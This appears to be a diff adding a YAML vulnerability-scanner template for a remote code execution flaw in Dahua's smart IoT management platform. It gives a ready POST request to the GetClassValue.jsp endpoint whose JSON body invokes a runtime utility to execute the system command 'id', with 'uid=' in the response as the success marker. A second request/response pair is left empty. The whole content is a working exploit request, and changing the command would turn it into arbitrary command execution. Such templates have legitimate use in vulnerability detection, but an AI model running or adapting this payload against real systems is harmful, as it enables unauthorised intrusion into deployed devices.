@@ -1,0 +1,23 @@
+id:
+
+info:
+  name: 大华智能物联综合管理平台 GetClassValue.jsp 远程代码执行漏洞
+requests1:
+  method: POST
+  path: /evo-apigw/admin/API/Developer/GetClassValue.jsp
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+    Content-Type: application/json
+  data: |
+    {
+        "data": {
+            "clazzName": "com.dahua.admin.util.RuntimeUtil",
+            "methodName": "syncexecReturnInputStream",
+            "fieldName": ["id"]
+        }
+    }
+response1:
+  body: uid=
+  code: 200
+requests2:
+response2:
